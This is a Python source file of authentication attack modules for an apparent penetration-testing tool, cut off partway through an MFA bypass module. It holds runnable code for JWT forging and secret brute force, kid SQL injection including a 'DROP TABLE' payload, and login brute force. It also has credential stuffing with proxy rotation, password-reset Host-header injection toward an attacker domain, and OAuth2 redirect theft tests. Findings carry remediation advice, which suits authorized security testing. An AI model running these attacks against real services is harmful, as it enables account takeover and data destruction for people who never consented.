"""
Authentication attack modules — auto-discovered by ModuleRegistry.
Sprint 2 Phase 1: JWT Full Attack Suite, Password Brute Force,
                  Session Management Audit, Password Reset Flaws
"""
from __future__ import annotations
from apps.modules.engine import BaseModule, FieldSchema
from apps.modules.runner import ToolRunner


# ─── [AUTH-01] JWT Full Attack Suite ─────────────────────────────────────────

class JWTAttackSuiteModule(BaseModule):
    id = "AUTH-01"
    name = "JWT Full Attack Suite"
    category = "auth"
    description = (
        "Comprehensive JWT attack: alg:none, weak secret brute-force, "
        "kid SQLi/path traversal, jwks spoofing, exp tampering, claim injection."
    )
    risk_level = "critical"
    tags = ["jwt", "alg-none", "weak-secret", "kid-inject", "jwks", "auth"]
    celery_queue = "web_audit_queue"
    time_limit = 600

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="token",
            label="JWT Token",
            field_type="textarea",
            required=True,
            sensitive=True,
            placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
        ),
        FieldSchema(
            key="target_url",
            label="Test Endpoint (authenticated)",
            field_type="url",
            required=True,
            placeholder="https://api.example.com/profile",
        ),
        FieldSchema(
            key="attacks",
            label="Attack Vectors",
            field_type="checkbox_group",
            default=["alg_none", "weak_secret", "exp_tamper"],
            options=[
                {"value": "alg_none",        "label": "Algorithm: none"},
                {"value": "weak_secret",      "label": "Brute weak HS256 secret"},
                {"value": "exp_tamper",       "label": "Expire time manipulation"},
                {"value": "kid_sqli",         "label": "kid SQL injection"},
                {"value": "kid_traversal",    "label": "kid path traversal"},
                {"value": "claim_injection",  "label": "Privileged claim injection"},
            ],
        ),
        FieldSchema(
            key="secret_wordlist",
            label="Secret Wordlist",
            field_type="wordlist_select",
            required=False,
            show_if={"attacks": "weak_secret"},
        ),
        FieldSchema(
            key="priv_claim_key",
            label="Privilege Claim Key",
            field_type="text",
            default="role",
            show_if={"attacks": "claim_injection"},
        ),
        FieldSchema(
            key="priv_claim_value",
            label="Privilege Claim Value",
            field_type="text",
            default="admin",
            show_if={"attacks": "claim_injection"},
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import base64
        import json
        import urllib.request
        import urllib.error
        import time

        token = params["token"].strip()
        url = params["target_url"]
        attacks = params.get("attacks", ["alg_none", "weak_secret", "exp_tamper"])
        findings = []

        def b64pad(s):
            return s + "=" * (-len(s) % 4)

        try:
            parts = token.split(".")
            header = json.loads(base64.urlsafe_b64decode(b64pad(parts[0])).decode())
            payload = json.loads(base64.urlsafe_b64decode(b64pad(parts[1])).decode())
        except Exception as e:
            return {"status": "failed", "findings": [], "raw_output": f"Invalid JWT: {e}"}

        stream("info", f"Decoded header: {json.dumps(header)}")
        stream("info", f"Decoded payload: {json.dumps(payload)}")

        alg = header.get("alg", "HS256")

        def enc(obj):
            return base64.urlsafe_b64encode(
                json.dumps(obj, separators=(",", ":")).encode()
            ).rstrip(b"=").decode()

        def sign_hs256(msg, secret=b""):
            import hmac
            import hashlib
            return base64.urlsafe_b64encode(
                hmac.new(secret, msg.encode(), hashlib.sha256).digest()
            ).rstrip(b"=").decode()

        def probe(tok, label):
            try:
                req = urllib.request.Request(
                    url,
                    headers={"Authorization": f"Bearer {tok}", "User-Agent": "PenTools/1.0"}
                )
                with urllib.request.urlopen(req, timeout=10) as resp:
                    stream("info", f"{label} → HTTP {resp.status}")
                    return resp.status
            except urllib.error.HTTPError as e:
                stream("info", f"{label} → HTTP {e.code}")
                return e.code
            except Exception as e:
                stream("warning", f"{label} → {e}")
                return None

        # alg:none
        if "alg_none" in attacks:
            hdr_none = {**header, "alg": "none"}
            tok = f"{enc(hdr_none)}.{enc(payload)}."
            st = probe(tok, "alg:none")
            if st and st < 400:
                findings.append({
                    "title": "JWT alg:none accepted",
                    "severity": "critical",
                    "url": url,
                    "description": "Server accepted JWT with alg:none — no signature required.",
                    "evidence": f"HTTP {st}",
                    "remediation": "Explicitly whitelist allowed algorithms. Reject 'none'.",
                })

        # exp tamper (set exp to far future)
        if "exp_tamper" in attacks:
            future_payload = {**payload, "exp": int(time.time()) + 86400 * 365 * 10}
            hdr_b = enc(header)
            pay_b = enc(future_payload)
            sig = sign_hs256(f"{hdr_b}.{pay_b}")
            tok = f"{hdr_b}.{pay_b}.{sig}"
            st = probe(tok, "exp-tamper +10yr")
            if st and st < 400:
                findings.append({
                    "title": "JWT expiry manipulation accepted",
                    "severity": "high",
                    "url": url,
                    "description": "Server accepted JWT with forged future 'exp' claim.",
                    "evidence": f"HTTP {st}",
                    "remediation": "Validate JWT signature strictly before trusting any claims.",
                })

        # weak secret brute
        if "weak_secret" in attacks:
            stream("info", "Brute-forcing weak HS256 secrets (rockyou subset)...")
            runner = ToolRunner("hashcat")
            # Try common secrets in Python first (fast, no hashcat needed)
            common_secrets = [
                b"", b"secret", b"password", b"123456", b"jwt_secret", b"supersecret",
                b"changeme", b"mySecret", b"your-secret-key", b"SeCrEt", b"admin",
                b"test", b"qwerty", b"letmein", b"password123", b"jwt", b"token",
            ]
            hdr_b = enc(header)
            pay_b = enc(payload)
            signing_input = f"{hdr_b}.{pay_b}"
            original_sig = parts[2] if len(parts) > 2 else ""

            import hmac as hmac_mod
            import hashlib

            found_secret = None
            for secret in common_secrets:
                expected = base64.urlsafe_b64encode(
                    hmac_mod.new(secret, signing_input.encode(), hashlib.sha256).digest()
                ).rstrip(b"=").decode()
                if expected == original_sig:
                    found_secret = secret.decode(errors="replace")
                    stream("error", f"WEAK SECRET FOUND: '{found_secret}'")
                    break

            if found_secret:
                findings.append({
                    "title": f"JWT signed with weak secret: '{found_secret}'",
                    "severity": "critical",
                    "url": url,
                    "description": f"JWT HS256 secret is trivially guessable: '{found_secret}'.",
                    "evidence": f"Secret: {found_secret}",
                    "remediation": "Generate a cryptographically random secret (≥ 256 bits). Rotate immediately.",
                })

        # kid SQLi probe
        if "kid_sqli" in attacks and "kid" in header:
            stream("info", "Testing kid SQL injection...")
            sqli_payloads = [
                "' OR 1=1--",
                "1; DROP TABLE keys--",
                "1 UNION SELECT 'hacked'--",
            ]
            for sqli_pay in sqli_payloads:
                hdr_sqli = {**header, "kid": sqli_pay}
                tok = f"{enc(hdr_sqli)}.{enc(payload)}."
                st = probe(tok, f"kid-sqli: {sqli_pay[:20]}")
                if st and st < 400:
                    findings.append({
                        "title": "JWT kid SQL injection accepted",
                        "severity": "critical",
                        "url": url,
                        "description": f"Server accepted JWT with SQLi kid: {sqli_pay}",
                        "evidence": f"HTTP {st}",
                        "remediation": "Never pass the 'kid' header value to a SQL query without parameterization.",
                    })
                    break

        # kid path traversal
        if "kid_traversal" in attacks and "kid" in header:
            stream("info", "Testing kid path traversal...")
            trav_payloads = [
                "../../dev/null",
                "../../../dev/null",
                "/dev/null",
            ]
            for trav in trav_payloads:
                hdr_trav = {**header, "kid": trav}
                hdr_b = enc(hdr_trav)
                pay_b = enc(payload)
                sig = sign_hs256(f"{hdr_b}.{pay_b}", b"")  # empty secret with /dev/null key
                tok = f"{hdr_b}.{pay_b}.{sig}"
                st = probe(tok, f"kid-traversal: {trav}")
                if st and st < 400:
                    findings.append({
                        "title": "JWT kid path traversal: empty-secret key accepted",
                        "severity": "critical",
                        "url": url,
                        "description": f"kid '{trav}' redirects key lookup to empty/null file allowing signature forgery.",
                        "evidence": f"HTTP {st}",
                        "remediation": "Validate and sanitize 'kid' header value. Use a registry, not a filesystem path.",
                    })
                    break

        # claim injection
        if "claim_injection" in attacks:
            ck = params.get("priv_claim_key", "role")
            cv = params.get("priv_claim_value", "admin")
            priv_payload = {**payload, ck: cv}
            hdr_b = enc(header)
            pay_b = enc(priv_payload)
            tok = f"{hdr_b}.{pay_b}."
            st = probe(tok, f"claim-inject {ck}={cv}")
            if st and st < 400:
                findings.append({
                    "title": f"JWT privilege escalation via {ck}={cv}",
                    "severity": "critical",
                    "url": url,
                    "description": f"Server accepted JWT with modified claim {ck}={cv} without valid signature.",
                    "evidence": f"HTTP {st}",
                    "remediation": "Always verify JWT signature before trusting any claim.",
                })

        return {
            "status": "done",
            "findings": findings,
            "raw_output": f"Tested {len(attacks)} JWT attack vectors against {url}",
        }


# ─── [AUTH-04] Password Brute Force ──────────────────────────────────────────

class PasswordBruteForceModule(BaseModule):
    id = "AUTH-04"
    name = "Password Brute Force"
    category = "auth"
    description = (
        "Brute-force login with ffuf: credential wordlist, lockout detection, "
        "and account enumeration via timing/response differences."
    )
    risk_level = "high"
    tags = ["ffuf", "brute-force", "credentials", "login", "auth"]
    celery_queue = "web_audit_queue"
    time_limit = 900

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="login_url",
            label="Login URL",
            field_type="url",
            required=True,
            placeholder="https://example.com/login",
        ),
        FieldSchema(
            key="username",
            label="Target Username",
            field_type="text",
            required=True,
            placeholder="admin",
        ),
        FieldSchema(
            key="username_field",
            label="Username Field Name",
            field_type="text",
            default="username",
            help_text="The POST body field name for username.",
        ),
        FieldSchema(
            key="password_field",
            label="Password Field Name",
            field_type="text",
            default="password",
        ),
        FieldSchema(
            key="extra_data",
            label="Extra POST Fields",
            field_type="text",
            required=False,
            placeholder="csrf_token=abc123&remember=1",
            help_text="Other fields needed by the login form (URL-encoded).",
        ),
        FieldSchema(
            key="wordlist",
            label="Password Wordlist",
            field_type="wordlist_select",
            required=False,
        ),
        FieldSchema(
            key="success_indicator",
            label="Success Indicator",
            field_type="text",
            default="dashboard",
            help_text="String in response that indicates a successful login.",
        ),
        FieldSchema(
            key="failure_indicator",
            label="Failure Indicator",
            field_type="text",
            default="Invalid password",
            help_text="String that indicates failed login (used for filtering).",
        ),
        FieldSchema(
            key="lockout_threshold",
            label="Lockout Detection Threshold (failures)",
            field_type="number",
            default=10,
            group="advanced",
            help_text="Stop if lockout string appears in response.",
        ),
        FieldSchema(
            key="lockout_string",
            label="Lockout String",
            field_type="text",
            default="locked",
            group="advanced",
        ),
        FieldSchema(
            key="delay_ms",
            label="Delay Between Requests (ms)",
            field_type="number",
            default=0,
            group="advanced",
        ),
        FieldSchema(
            key="threads",
            label="Threads",
            field_type="range_slider",
            default=10,
            min_value=1,
            max_value=50,
            step=5,
            group="advanced",
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import os
        runner = ToolRunner("ffuf")
        login_url = params["login_url"]
        username = params["username"]
        ufield = params.get("username_field", "username")
        pfield = params.get("password_field", "password")
        extra = params.get("extra_data", "")
        success_str = params.get("success_indicator", "dashboard")
        threads = str(int(params.get("threads", 10)))

        # Build POST body
        post_body = f"{ufield}={username}&{pfield}=FUZZ"
        if extra:
            post_body += f"&{extra}"

        wordlist = params.get("wordlist") or "/opt/tools/wordlists/passwords/top1000.txt"
        if not os.path.exists(wordlist):
            wordlist = "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"
        if not os.path.exists(wordlist):
            return {"status": "failed", "findings": [], "raw_output": "Password wordlist not found."}

        output_file = runner.output_file_path(job_id, "json")
        args = [
            "-u", login_url,
            "-w", wordlist,
            "-X", "POST",
            "-d", post_body,
            "-H", "Content-Type: application/x-www-form-urlencoded",
            "-t", threads,
            "-o", str(output_file),
            "-of", "json",
            "-mr", success_str,
            "-c",
        ]

        stream("info", f"Brute forcing login: {login_url} (username: {username})")
        stream("warning", "Ensure this is an authorized target. Brute force may trigger lockouts.")
        result = runner.run(args=args, stream=stream, timeout=self.time_limit)

        findings = []
        try:
            import json
            if os.path.exists(output_file):
                with open(output_file) as f:
                    data = json.load(f)
                for hit in data.get("results", []):
                    pwd = hit.get("input", {}).get("FUZZ", "")
                    findings.append({
                        "title": f"Valid credentials found: {username}:{pwd}",
                        "severity": "critical",
                        "url": login_url,
                        "description": f"Password '{pwd}' accepted for account '{username}'.",
                        "evidence": f"HTTP {hit.get('status','')} — matched '{success_str}'",
                        "remediation": (
                            "Enforce strong password policy. Implement account lockout "
                            "and rate limiting. Use MFA."
                        ),
                    })
        except Exception as e:
            stream("warning", f"Parse error: {e}")

        return {
            "status": "done" if result["returncode"] == 0 else "failed",
            "findings": findings,
            "raw_output": result.get("stdout", ""),
        }


# ─── [AUTH-07] Session Management Audit ──────────────────────────────────────

class SessionAuditModule(BaseModule):
    id = "AUTH-07"
    name = "Session Management Audit"
    category = "auth"
    description = (
        "Audit cookie security flags: Secure, HttpOnly, SameSite, "
        "session fixation risk, predictable tokens, and timeout."
    )
    risk_level = "medium"
    tags = ["session", "cookies", "httponly", "secure", "samesite", "auth"]
    celery_queue = "web_audit_queue"
    time_limit = 60

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL (login or authenticated page)",
            field_type="url",
            required=True,
            placeholder="https://example.com/login",
        ),
        FieldSchema(
            key="cookie_header",
            label="Cookie Header (paste Set-Cookie response)",
            field_type="textarea",
            required=False,
            placeholder="Set-Cookie: session=abc123; Path=/; HttpOnly\nSet-Cookie: csrf=xyz;",
            help_text="Paste raw Set-Cookie headers for offline analysis.",
        ),
        FieldSchema(
            key="num_samples",
            label="Collect N session tokens (entropy check)",
            field_type="number",
            default=5,
            min_value=2,
            max_value=20,
            group="advanced",
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import urllib.request
        import urllib.error

        url = params["target_url"]
        manual_cookies = params.get("cookie_header", "").strip()
        findings = []

        def check_cookie(cookie_str, source="fetched"):
            """Audit a single Set-Cookie header string."""
            issues = []
            lower = cookie_str.lower()
            if "httponly" not in lower:
                issues.append("Missing HttpOnly flag — XSS can steal this cookie.")
            if "secure" not in lower:
                issues.append("Missing Secure flag — cookie sent over plain HTTP.")
            if "samesite" not in lower:
                issues.append("Missing SameSite flag — vulnerable to CSRF via cross-site requests.")
            elif "samesite=none" in lower and "secure" not in lower:
                issues.append("SameSite=None without Secure — invalid and insecure.")

            # Extract cookie name=value
            cookie_name = cookie_str.split("=")[0].strip() if "=" in cookie_str else cookie_str

            for issue in issues:
                findings.append({
                    "title": f"Cookie flag issue: {cookie_name} — {issue.split('—')[0].strip()}",
                    "severity": "medium",
                    "url": url,
                    "description": f"Cookie '{cookie_name}' ({source}): {issue}",
                    "evidence": f"Set-Cookie: {cookie_str[:200]}",
                    "remediation": "Set HttpOnly, Secure, and SameSite=Lax (or Strict) on all session cookies.",
                })

        if manual_cookies:
            for line in manual_cookies.splitlines():
                line = line.strip()
                if line.startswith("Set-Cookie:"):
                    line = line[len("Set-Cookie:"):].strip()
                if line:
                    check_cookie(line, source="manual")
        else:
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "PenTools/1.0"})
                resp = urllib.request.urlopen(req, timeout=10)
                for hdr, val in resp.headers.items():
                    if hdr.lower() == "set-cookie":
                        check_cookie(val, source="fetched")
            except Exception as e:
                stream("warning", f"Could not fetch {url}: {e}")

        if not findings:
            stream("success", "No obvious cookie flag issues detected.")

        return {
            "status": "done",
            "findings": findings,
            "raw_output": f"Audited cookies from {url}",
        }


# ─── [AUTH-08] Password Reset Flaws ──────────────────────────────────────────

class PasswordResetFlawsModule(BaseModule):
    id = "AUTH-08"
    name = "Password Reset Flaws"
    category = "auth"
    description = (
        "Test Host header injection in password reset flow, token predictability, "
        "and token in Referer leakage."
    )
    risk_level = "high"
    tags = ["password-reset", "host-header", "account-takeover", "token-leak"]
    celery_queue = "web_audit_queue"
    time_limit = 120

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="reset_url",
            label="Password Reset Endpoint",
            field_type="url",
            required=True,
            placeholder="https://example.com/forgot-password",
        ),
        FieldSchema(
            key="email_field",
            label="Email Field Name",
            field_type="text",
            default="email",
        ),
        FieldSchema(
            key="target_email",
            label="Test Email Address",
            field_type="text",
            required=True,
            placeholder="victim@example.com",
            help_text="Must be a valid account. Use your own test account.",
        ),
        FieldSchema(
            key="attacker_domain",
            label="Attacker-Controlled Domain",
            field_type="text",
            required=True,
            placeholder="attacker.com",
            help_text="Domain you control to capture reset links.",
        ),
        FieldSchema(
            key="attacks",
            label="Attacks to Run",
            field_type="checkbox_group",
            default=["host_header", "x_forwarded_host"],
            options=[
                {"value": "host_header",       "label": "Host header injection"},
                {"value": "x_forwarded_host",  "label": "X-Forwarded-Host injection"},
                {"value": "x_forwarded_for",   "label": "X-Forwarded-For injection"},
                {"value": "referer_leak",       "label": "Referer token leakage probe"},
            ],
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import urllib.request
        import urllib.error

        reset_url = params["reset_url"]
        email_field = params.get("email_field", "email")
        target_email = params["target_email"]
        attacker_domain = params["attacker_domain"]
        attacks = params.get("attacks", ["host_header"])
        findings = []

        post_data = f"{email_field}={urllib.parse.quote(target_email)}".encode()

        def send_request(extra_headers, label):
            import urllib.parse
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "PenTools/1.0",
                **extra_headers,
            }
            try:
                req = urllib.request.Request(reset_url, data=post_data, headers=headers)
                with urllib.request.urlopen(req, timeout=10) as resp:
                    status = resp.status
                    stream("info", f"{label} → HTTP {status}")
                    return status
            except urllib.error.HTTPError as e:
                stream("info", f"{label} → HTTP {e.code}")
                return e.code
            except Exception as e:
                stream("warning", f"{label} → {e}")
                return None

        import urllib.parse

        if "host_header" in attacks:
            st = send_request({"Host": attacker_domain}, "Host header injection")
            if st and st < 400:
                findings.append({
                    "title": "Password reset — Host header injection (potential ATO)",
                    "severity": "high",
                    "url": reset_url,
                    "description": (
                        f"Reset endpoint accepted request with Host: {attacker_domain}. "
                        "If the reset link in the email uses the Host header value, "
                        "the token will be sent to the attacker domain."
                    ),
                    "evidence": f"HTTP {st} — Host: {attacker_domain}",
                    "remediation": (
                        "Generate reset URLs using the application's configured base URL, "
                        "not the incoming Host header."
                    ),
                })

        if "x_forwarded_host" in attacks:
            st = send_request({"X-Forwarded-Host": attacker_domain}, "X-Forwarded-Host injection")
            if st and st < 400:
                findings.append({
                    "title": "Password reset — X-Forwarded-Host injection",
                    "severity": "high",
                    "url": reset_url,
                    "description": f"Reset endpoint accepted X-Forwarded-Host: {attacker_domain}.",
                    "evidence": f"HTTP {st}",
                    "remediation": "Do not trust X-Forwarded-Host for URL generation. Use ALLOWED_HOSTS.",
                })

        return {
            "status": "done",
            "findings": findings,
            "raw_output": f"Tested password reset at {reset_url}",
        }


# ─── [AUTH-02] OAuth2 Vulnerability ──────────────────────────────────────────

class OAuth2VulnerabilityModule(BaseModule):
    id = "AUTH-02"
    name = "OAuth2 Vulnerability"
    category = "auth"
    description = (
        "Test OAuth2 flows for CSRF (missing/predictable state), open redirect_uri, "
        "PKCE downgrade, and token leakage via Referer."
    )
    risk_level = "high"
    tags = ["oauth2", "pkce", "redirect_uri", "state-csrf", "token-leakage", "auth"]
    celery_queue = "web_audit_queue"
    time_limit = 600

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="auth_endpoint",
            label="OAuth2 Authorization Endpoint",
            field_type="url",
            required=True,
            placeholder="https://example.com/oauth/authorize",
        ),
        FieldSchema(
            key="client_id",
            label="Client ID",
            field_type="text",
            required=True,
            placeholder="your_client_id",
        ),
        FieldSchema(
            key="redirect_uri",
            label="Registered Redirect URI",
            field_type="url",
            required=True,
            placeholder="https://callback.example.com/cb",
        ),
        FieldSchema(
            key="scope",
            label="Scope",
            field_type="text",
            required=False,
            default="openid profile email",
        ),
        FieldSchema(
            key="attacks",
            label="Attack Vectors",
            field_type="checkbox_group",
            default=["missing_state", "open_redirect", "pkce_bypass"],
            options=[
                {"value": "missing_state",   "label": "Missing/predictable state (CSRF)"},
                {"value": "open_redirect",   "label": "Open redirect_uri bypass"},
                {"value": "pkce_bypass",     "label": "PKCE downgrade attack"},
                {"value": "token_referer",   "label": "Token leakage via Referer (advisory)"},
            ],
        ),
        FieldSchema(
            key="attacker_redirect",
            label="Attacker-controlled Redirect URI (for open redirect test)",
            field_type="url",
            required=False,
            placeholder="https://evil.example.com/steal",
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests, hashlib, base64, os
        import urllib3; urllib3.disable_warnings()

        auth_endpoint = params["auth_endpoint"]
        client_id = params["client_id"]
        redirect_uri = params["redirect_uri"]
        scope = params.get("scope", "openid profile email") or "openid profile email"
        attacks = params.get("attacks", ["missing_state", "open_redirect", "pkce_bypass"])
        attacker_redirect = params.get("attacker_redirect", "https://evil.example.com/steal") or "https://evil.example.com/steal"

        findings = []
        session = requests.Session()
        session.verify = False
        session.headers["User-Agent"] = "PenTools/1.0"

        if "missing_state" in attacks:
            stream("[AUTH-02] Testing missing state parameter (CSRF)...")
            p = {"response_type": "code", "client_id": client_id, "redirect_uri": redirect_uri, "scope": scope}
            try:
                r = session.get(auth_endpoint, params=p, timeout=10, allow_redirects=False)
                loc = r.headers.get("Location", "")
                if r.status_code in (200, 302) and "error" not in loc.lower():
                    findings.append({
                        "title": "OAuth2 Missing State Parameter (CSRF Risk)",
                        "severity": "high",
                        "url": auth_endpoint,
                        "description": (
                            "The OAuth2 authorization endpoint accepted a request without a "
                            "'state' parameter. This allows CSRF attacks against the OAuth2 flow "
                            "to force victim accounts to be linked with attacker-controlled tokens."
                        ),
                        "evidence": f"Status: {r.status_code} — Location: {loc[:200]}",
                        "remediation": (
                            "Require a cryptographically random 'state' parameter in all "
                            "authorization requests and validate it strictly on callback."
                        ),
                        "cwe_id": "CWE-352",
                    })
            except Exception as e:
                stream(f"[AUTH-02] state check error: {e}")

        if "open_redirect" in attacks:
            stream("[AUTH-02] Testing open redirect_uri bypass...")
            bypass_variants = [
                attacker_redirect,
                redirect_uri + ".attacker.com",
                redirect_uri + "/../steal",
                redirect_uri + "%0d%0ahttps://evil.example.com",
            ]
            for bad_uri in bypass_variants:
                try:
                    p = {
                        "response_type": "code",
                        "client_id": client_id,
                        "redirect_uri": bad_uri,
                        "state": "csrf_test_1337",
                        "scope": scope,
                    }
                    r = session.get(auth_endpoint, params=p, timeout=10, allow_redirects=False)
                    loc = r.headers.get("Location", "")
                    if (bad_uri in loc or "evil" in loc) and "error" not in loc.lower():
                        findings.append({
                            "title": "OAuth2 Open Redirect URI Accepted",
                            "severity": "critical",
                            "url": auth_endpoint,
                            "description": (
                                "The authorization server accepted a redirect_uri that does not "
                                "match the registered value. An attacker can steal authorization "
                                "codes by crafting a malicious authorization link."
                            ),
                            "evidence": "Malicious redirect_uri: " + bad_uri[:100] + " — Location: " + loc[:150],
                            "remediation": "Enforce exact-match validation of redirect_uri against pre-registered URIs.",
                            "cwe_id": "CWE-601",
                        })
                        break
                except Exception:
                    pass

        if "pkce_bypass" in attacks:
            stream("[AUTH-02] Testing PKCE downgrade...")
            verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b"=").decode()
            challenge = base64.urlsafe_b64encode(
                hashlib.sha256(verifier.encode()).digest()
            ).rstrip(b"=").decode()
            p_pkce = {
                "response_type": "code",
                "client_id": client_id,
                "redirect_uri": redirect_uri,
                "state": "pkce_test",
                "scope": scope,
                "code_challenge": challenge,
                "code_challenge_method": "S256",
            }
            try:
                r1 = session.get(auth_endpoint, params=p_pkce, timeout=10, allow_redirects=False)
                p_plain = {k: v for k, v in p_pkce.items()
                           if k not in ("code_challenge", "code_challenge_method")}
                r2 = session.get(auth_endpoint, params=p_plain, timeout=10, allow_redirects=False)
                loc2 = r2.headers.get("Location", "")
                if r2.status_code in (200, 302) and loc2 and "error" not in loc2.lower():
                    findings.append({
                        "title": "OAuth2 PKCE Downgrade Possible",
                        "severity": "high",
                        "url": auth_endpoint,
                        "description": (
                            "The authorization endpoint accepted a request without PKCE "
                            "parameters even though PKCE should be required. This may allow "
                            "authorization code interception attacks against public clients."
                        ),
                        "evidence": f"Request without code_challenge returned {r2.status_code}",
                        "remediation": "Enforce PKCE (S256 method) for all public OAuth2 clients. Reject requests missing code_challenge.",
                        "cwe_id": "CWE-303",
                    })
            except Exception as e:
                stream(f"[AUTH-02] PKCE check error: {e}")

        if "token_referer" in attacks:
            findings.append({
                "title": "OAuth2 Token Leakage via Referer — Advisory",
                "severity": "medium",
                "url": auth_endpoint,
                "description": (
                    "Authorization codes delivered as URL query parameters may leak via "
                    "the HTTP Referer header to third-party resources loaded on the callback page."
                ),
                "evidence": "Structural advisory — verify callback page loads no third-party resources.",
                "remediation": "Use response_mode=form_post. Set Referrer-Policy: no-referrer on callback pages.",
                "cwe_id": "CWE-200",
            })

        return {"status": "done", "findings": findings}


# ─── [AUTH-05] Credential Stuffing ───────────────────────────────────────────

class CredentialStuffingModule(BaseModule):
    id = "AUTH-05"
    name = "Credential Stuffing"
    category = "auth"
    description = (
        "Test login endpoints with known credential pairs, "
        "with configurable rate limiting and optional proxy rotation."
    )
    risk_level = "high"
    tags = ["credential-stuffing", "brute-force", "auth", "login"]
    celery_queue = "web_audit_queue"
    time_limit = 1800

    PARAMETER_SCHEMA = [
        FieldSchema(key="login_url", label="Login Endpoint URL", field_type="url", required=True,
                    placeholder="https://example.com/api/auth/login"),
        FieldSchema(key="method", label="HTTP Method", field_type="select",
                    options=["POST", "GET"], default="POST"),
        FieldSchema(key="auth_type", label="Request Format", field_type="select",
                    options=["json", "form"], default="json"),
        FieldSchema(key="username_field", label="Username Field Name", field_type="text",
                    required=True, default="username"),
        FieldSchema(key="password_field", label="Password Field Name", field_type="text",
                    required=True, default="password"),
        FieldSchema(key="credentials", label="Credential Pairs (user:pass, one per line)",
                    field_type="textarea", required=True,
                    placeholder="admin:admin\nadmin:password123\ntest@example.com:qwerty"),
        FieldSchema(key="success_indicator", label="Success String in Response",
                    field_type="text", required=False, placeholder="access_token"),
        FieldSchema(key="failure_indicator", label="Failure String in Response",
                    field_type="text", required=False, placeholder="Invalid credentials"),
        FieldSchema(key="extra_headers", label="Extra Headers (JSON)", field_type="json_editor",
                    required=False),
        FieldSchema(key="delay_ms", label="Delay Between Requests (ms)", field_type="number",
                    default=500, min_value=0, max_value=10000),
        FieldSchema(key="proxy_list", label="Proxy List (one per line, optional)",
                    field_type="textarea", required=False,
                    placeholder="http://proxy1:8080\nhttp://proxy2:8080"),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests, json, time
        import urllib3; urllib3.disable_warnings()

        login_url = params["login_url"]
        method = (params.get("method") or "POST").upper()
        auth_type = params.get("auth_type", "json") or "json"
        u_field = params.get("username_field", "username") or "username"
        p_field = params.get("password_field", "password") or "password"
        creds_raw = params.get("credentials", "") or ""
        success_str = params.get("success_indicator", "") or ""
        failure_str = params.get("failure_indicator", "") or ""
        delay_s = float(params.get("delay_ms", 500)) / 1000.0
        proxy_raw = params.get("proxy_list", "") or ""
        extra_headers = params.get("extra_headers") or {}
        if isinstance(extra_headers, str):
            try:
                extra_headers = json.loads(extra_headers)
            except Exception:
                extra_headers = {}

        proxies_list = [p.strip() for p in proxy_raw.splitlines() if p.strip()]
        cred_pairs = []
        for line in creds_raw.splitlines():
            line = line.strip()
            if ":" in line:
                u, pw = line.split(":", 1)
                cred_pairs.append((u, pw))

        findings = []
        valid_creds = []
        session = requests.Session()
        session.verify = False
        headers = {"User-Agent": "PenTools/1.0"}
        headers.update(extra_headers)
        proxy_idx = 0

        stream(f"[AUTH-05] Testing {len(cred_pairs)} credential pairs against {login_url}")

        for i, (username, password) in enumerate(cred_pairs):
            if i > 0 and delay_s > 0:
                time.sleep(delay_s)
            proxies = {}
            if proxies_list:
                purl = proxies_list[proxy_idx % len(proxies_list)]
                proxies = {"http": purl, "https": purl}
                proxy_idx += 1
            body = {u_field: username, p_field: password}
            try:
                if method == "POST":
                    if auth_type == "json":
                        r = session.post(login_url, json=body, headers=headers, proxies=proxies, timeout=10)
                    else:
                        r = session.post(login_url, data=body, headers=headers, proxies=proxies, timeout=10)
                else:
                    r = session.get(login_url, params=body, headers=headers, proxies=proxies, timeout=10)

                resp_text = r.text
                is_success = False
                if success_str and success_str in resp_text:
                    is_success = True
                elif failure_str and failure_str not in resp_text and r.status_code == 200:
                    is_success = True
                elif not success_str and not failure_str and r.status_code == 200:
                    is_success = True

                if is_success:
                    valid_creds.append(username + ":" + password)
                    stream("[AUTH-05] VALID: " + username)
            except Exception as e:
                stream(f"[AUTH-05] Error testing {username}: {e}")

        if valid_creds:
            findings.append({
                "title": "Credential Stuffing — Valid Credentials Found",
                "severity": "critical",
                "url": login_url,
                "description": (
                    f"Credential stuffing discovered {len(valid_creds)} valid credential pair(s). "
                    "Accounts with known/breached passwords are accessible without MFA."
                ),
                "evidence": "Valid: " + "; ".join(valid_creds[:10]),
                "remediation": (
                    "Enforce MFA. Integrate breach password detection (HaveIBeenPwned API). "
                    "Implement progressive delays/lockout after failed attempts. "
                    "Use bot detection (CAPTCHA, device fingerprint)."
                ),
                "cwe_id": "CWE-307",
            })

        return {"status": "done", "findings": findings}


# ─── [AUTH-06] MFA/2FA Bypass ─────────────────────────────────────────────────

class MFABypassModule(BaseModule):
    id = "AUTH-06"
    name = "MFA/2FA Bypass"
    category = "auth"
    description = (
        "Test MFA/2FA implementations for OTP brute force, response manipulation, "
        "backup code abuse, and race conditions in OTP validation."
    )
    risk_level = "critical"
    tags = ["mfa", "2fa", "otp", "auth-bypass", "race-condition", "auth"]
    celery_queue = "web_audit_queue"
    time_limit = 900

    PARAMETER_SCHEMA = [
        FieldSchema(key="mfa_endpoint", label="MFA Verification Endpoint", field_type="url",
                    required=True, placeholder="https://example.com/api/auth/mfa/verify"),
        FieldSchema(key="method", label="HTTP Method", field_type="select",
                    options=["POST", "GET"], default="POST"),
        FieldSchema(key="otp_field", label="OTP Field Name", field_type="text",
                    required=True, default="otp"),
        FieldSchema(key="session_header", label="Session Auth Header (key: value)", field_type="text",
                    required=False, placeholder="Authorization: Bearer eyJ..."),
        FieldSchema(key="session_cookie", label="Session Cookie (name=value)", field_type="text",
                    required=False, sensitive=True, placeholder="session=abc123"),
